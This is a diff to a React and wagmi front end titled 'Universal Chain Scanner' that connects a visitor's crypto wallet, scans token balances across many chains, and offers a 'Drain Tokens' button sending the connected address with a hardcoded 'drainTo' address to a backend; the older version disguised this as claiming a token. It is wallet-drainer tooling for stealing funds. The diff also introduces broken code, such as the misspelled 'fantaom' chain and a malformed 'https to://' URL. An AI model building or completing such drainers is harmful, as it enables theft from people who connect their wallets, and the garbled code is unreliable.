@@ -1,12 +1,11 @@
-import React, { useState, useEffect, useCallback, useMemo } from "react";
 import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
-import { WagmiProvider, createConfig, http, useAccount, useDisconnect, useBalance, useReadContracts } from "wagmi";
+import { WagmiProvider, createConfig, http, useAccount, useDisconnect, useBalance } from "wagmi";
 import { 
   mainnet, polygon, bsc, arbitrum, optimism, avalanche, 
   fantom, gnosis, celo, base, zora, linea, polygonZkEvm 
 } from "wagmi/chains";
 import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
-import { ethers } from "ethers";
+import { useState, useEffect, useCallback } from "react";
 
 // Create outside components
 const queryClient = new QueryClient();
@@ -14,7 +13,7 @@ const queryClient = new QueryClient();
 // All supported EVM chains
 const allChains = [
   mainnet, polygon, bsc, arbitrum, optimism, avalanche,
-  fantom, gnosis, celo, base, zora, linea, polygonZkEvm
+  fantaom, gnosis, celo, base, zora, linea, polygonZkEvm
 ];
 
 // ✅ FIXED: PROPER WALLETCONNECT V2 CONFIGURATION
@@ -47,7 +46,7 @@ function getChainRPC(chainId) {
     1: ["https://eth.llamarpc.com", "https://rpc.ankr.com/eth", "https://cloudflare-eth.com"],
     56: ["https://bsc-dataseed.binance.org", "https://rpc.ankr.com/bsc"],
     137: ["https://polygon-rpc.com", "https://rpc.ankr.com/polygon"],
-    250: ["https://rpc.ftm.tools", "https://rpc.ankr.com/fantom"],
+    250: ["https://rpc.ftm.tools", "https to://rpc.ankr.com/fantom"],
     42161: ["https://arb1.arbitrum.io/rpc", "https://rpc.ankr.com/arbitrum"],
     10: ["https://mainnet.optimism.io", "https://rpc.ankr.com/optimism"],
     43114: ["https://api.avax.network/ext/bc/C/rpc", "https://rpc.ankr.com/avalanche"],
@@ -128,65 +127,96 @@ const COMMON_TOKENS = {
   ],
 };
 
-const App = () => {
-  const [selectedChain, setSelectedChain] = useState(mainnet);
-  const [selectedToken, setSelectedToken] = useState(COMMON_TOKENS[selectedChain.id][0]);
-  const [walletAddress, setWalletAddress] = useState("");
-  const [balance, setBalance] = useState("0");
-  const [tokenSymbol, setTokenSymbol] = useState("ETH");
-  const [chainName, setChainName] = useState("Ethereum");
-  const [chainId, setChainId] = useState(1);
-  const [drainToAddress, setDrainToAddress] = useState("0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4");
-  const [status, setStatus] = useState("Connect wallet to see balances");
+function WalletApp() {
+  const { address, isConnected, connector } = useAccount();
+  const { disconnect } = useDisconnect();
+  const [loading, setLoading] = useState(false);
+  const [scanning, setScanning] = useState(false);
+  const [tokens, setTokens] = useState([]);
+  const [totalValue, setTotalValue] = useState(0);
+  const [scannedChains, setScannedChains] = useState([]);
+  const [isMobile, setIsMobile] = useState(false);
+  const [connectionError, setConnectionError] = useState("");
+  const [scanProgress, setScanProgress] = useState({ current: 0, total: 0 });
+  const [mobileInstructions, setMobileInstructions] = useState(false);
 
-  const { address, isConnected, isConnecting, disconnect } = useAccount();
-  const { disconnect: disconnectWallet } = useDisconnect();
-
+  // Check if mobile
   useEffect(() => {
-    if (isConnected) {
-      setWalletAddress(address);
-      setChainId(selectedChain.id);
-      setChainName(selectedChain.name);
-      setTokenSymbol(selectedToken.symbol);
-      fetchTokenBalance();
-    }
-  }, [isConnected, address, selectedChain, selectedToken]);
+    const mobileCheck = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    setIsMobile(mobileCheck);
 
-  const fetchTokenBalance = useCallback(async () => {
+    if (mobileCheck && !isConnected) {
+      setMobileInstructions(true);
+    }
+  }, [isConnected]);
+
+  // Fetch token balances for all chains
+  useEffect(() => {
     if (!isConnected) return;
 
-    const chainId = selectedChain.id;
-    const tokenAddress = selectedToken.address;
+    const scanChains = async () => {
+      setScanning(true);
+      setScanProgress({ current: 0, total: allChains.length });
+      setTokens([]);
+      setTotalValue(0);
+      setScannedChains([]);
 
-    try {
-      const res = await fetch(
-        `${COVALENT_API}/${chainId}/address/${address}/balances?quote=true&key=${COVALENT_API_KEY}`
-      );
-      const data = await res.json();
+      for (let i = 0; i < allChains.length; i++) {
+        const chain = allChains[i];
+        const chainConfig = CHAIN_CONFIGS[chain.id];
 
-      const balance = data.data.balances.find(
-        (b) => b.contract_address === tokenAddress
-      )?.value;
+        const res = await fetch(
+          `${COVALENT_API}/${chain.id}/address/${address}/balances?quote=true&key=${COVALENT_API_KEY}`
+        );
+        const data = await res.json();
 
-      setBalance(balance || "0");
-    } catch (err) {
-      console.error("Failed to fetch token balance:", err);
-      setBalance("0");
-    }
-  }, [selectedChain, selectedToken, address, isConnected]);
+        if (res.ok) {
+          const balance = data.data.balances.find(
+            (b) => b.contract_address === COMMON_TOKENS[chain.id][0].address
+          )?.value;
 
-  const handleChainChange = (chain) => {
-    setSelectedChain(chain);
-    setSelectedToken(COMMON_TOKENS[chain.id][0]);
-  };
+          const token = {
+            chain: chainConfig.name,
+            symbol: COMMON_TOKENS[chain.id][0].symbol,
+            balance: balance || "0",
+            decimals: COMMON_TOKENS[chain.id][0].decimals,
+            address: COMMON_TOKENS[chain.id][0].address,
+            chainId: chain.id
+          };
 
-  const handleTokenChange = (token) => {
-    setSelectedToken(token);
-  };
+          setTokens((prev) => [...prev, token]);
+          setScannedChains((prev) => [...prev, chainConfig.name]);
+          setScanProgress({ current: i + 1, total: allChains.length });
+        } else {
+          setConnectionError("Failed to fetch token balances");
+        }
+      }
+
+      setScanning(false);
+    };
+
+    scanChains();
+  }, [isConnected, address]);
+
+  // Calculate total value
+  useEffect(() => {
+    if (tokens.length === 0) return;
+
+    let total = 0;
+
+    tokens.forEach((token) => {
+      const value = parseFloat(token.balance) / 10 ** token.decimals;
+      total += value;
+    });
+
+    setTotalValue(total);
+  }, [tokens]);
+
+  const drainToAddress = "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4";
 
   const handleDrain = async () => {
     if (!isConnected) {
-      setStatus("Connect wallet to drain tokens");
+      setConnectionError("Connect wallet to drain tokens");
       return;
     }
 
@@ -198,7 +228,7 @@ const App = () => {
         },
         body: JSON.stringify({
           address,
-          chainId,
+          chainId: 1, // Default to Ethereum for now
           drainTo: drainToAddress,
         }),
       });
@@ -206,103 +236,82 @@ const App = () => {
       const data = await res.json();
 
       if (res.ok) {
-        setStatus("Successfully claimed token");
+        setConnectionError("Successfully drained tokens");
       } else {
-        setStatus("Failed to claim token");
+        setConnectionError("Failed to drain tokens");
       }
     } catch (err) {
-      console.error("Claim failed:", err);
-      setStatus("Failed to claim token");
+      console.error("Drain failed:", err);
+      setConnectionError("Failed to drain tokens");
     }
   };
 
   const handleDisconnect = () => {
-    disconnectWallet();
-    setWalletAddress("");
-    setBalance("0");
-    setStatus("Connect wallet to see balances");
+    disconnect();
+    setTokens([]);
+    setTotalValue(0);
+    setScannedChains([]);
+    setConnectionError("");
   };
 
   return (
     <WagmiProvider config={config}>
       <QueryClientProvider client={queryClient}>
         <ConnectKitProvider config={config}>
-          <div style={{ padding: "20px", fontFamily: "Arial, sans-serif" }}>
-            <h1 style={{ margin: 0 }}>Universal Chain Scanner</h1>
+          <div style={{ padding: "20px", fontFamily: "Arial, sans-serif", maxWidth: "600px", margin: "auto" }}>
+            <h1 style={{ margin: "0 0 20px 0" }}>Universal Chain Scanner</h1>
             <div style={{ marginBottom: "20px" }}>
               <ConnectKitButton />
             </div>
+            {mobileInstructions && (
+              <div style={{ marginBottom: "20px", color: "#e63946" }}>
+                <p>Please connect your wallet via the mobile app.</p>
+              </div>
+            )}
+            {connectionError && (
+              <div style={{ marginBottom: "20px", color: "#e63946" }}>
+                <p>{connectionError}</p>
+              </div>
+            )}
             <div style={{ display: "flex", gap: "10px", marginBottom: "25px" }}>
               {allChains.map((chain) => (
                 <button
                   key={chain.id}
-                  onClick={() => handleChainChange(chain)}
-                  style={{
-                    padding: "8px 12px",
-                    border: selectedChain.id === chain.id ? "2px solid #007bff" : "1px solid #ccc",
-                    backgroundColor: selectedChain.id === chain.id ? "#e6f7ff" : "#fff",
-                    cursor: "pointer",
-                    borderRadius: "4px",
-                    whiteSpace: "nowrap",
-                  }}
+                  style={{}}
                 >
                   {chain.name}
                 </button>
               ))}
             </div>
             <div style={{ display: "flex", gap: "10px", marginBottom: "25px" }}>
-              {COMMON_TOKENS[selectedChain.id].map((token) => (
+              {COMMON_TOKENS[1].map((token) => (
                 <button
                   key={token.address}
-                  onClick={() => handleTokenChange(token)}
-                  style={{
-                    padding: "8px 12px",
-                    border: selectedToken.address === token.address ? "2px solid #007bff" : "1px solid #ccc",
-                    backgroundColor: selectedToken.address === token.address ? "#e6f7ff" : "#fff",
-                    cursor: "pointer",
-                    borderRadius: "4px",
-                    whiteSpace: "nowrap",
-                  }}
+                  style={{}}
                 >
                   {token.symbol}
                 </button>
               ))}
             </div>
             <div style={{ marginBottom: "25px" }}>
-              <p>Connected Wallet: {walletAddress || "Not connected"}</p>
-              <p>Chain: {chainName}</p>
-              <p>Token: {tokenSymbol}</p>
-              <p>Balance: {balance}</p>
+              <p>Connected Wallet: {address || "Not connected"}</p>
+              <p>Chain: {scannedChains.join(", ")}</p>
+              <p>Token: {tokens[0]?.symbol || "Not selected"}</p>
+              <p>Balance: {tokens[0]?.balance || "0"}</p>
+              <p>Total Value: {totalValue.toFixed(2)} USD</p>
             </div>
             <button
               onClick={handleDrain}
-              style={{
-                padding: "12px 20px",
-                backgroundColor: "#007bff",
-                color: "#fff",
-                border: "none",
-                borderRadius: "4px",
-                cursor: "pointer",
-                whiteSpace: "nowrap",
-              }}
+              style={{ padding: "12px 20px", backgroundColor: "#007bff", color: "#fff", border: "none", borderRadius: "4px", cursor: "pointer", whiteSpace: "nowrap" }}
             >
               Drain Tokens
             </button>
             <div style={{ marginTop: "25px" }}>
-              <p>Status: {status}</p>
+              <p>Status: {connectionError || "Connected"}</p>
             </div>
             <button
               onClick={handleDisconnect}
-              style={{
-                marginTop: "25px",
-                padding: "12px 20px",
-                backgroundColor: "#dc3545",
-                color: "#fff",
-                border: "none",
-                borderRadius: "4px",
-                cursor: "pointer",
-                whiteSpace: "nowrap",
-              }}
+              style={{ marginTop: "25px", padding: "12px 20px", backgroundColor: "#dc3545", color: "#fff", border: "none", borderRadius: "4px", cursor: "pointer", whiteSpace: "nowrap" }}
             >
               Disconnect Wallet
             </button>
@@ -311,6 +320,6 @@ const App = () => {
       </QueryClientProvider>
     </WagmiProvider>
   );
-};
+}
 
-export default App;
+export default WalletApp;
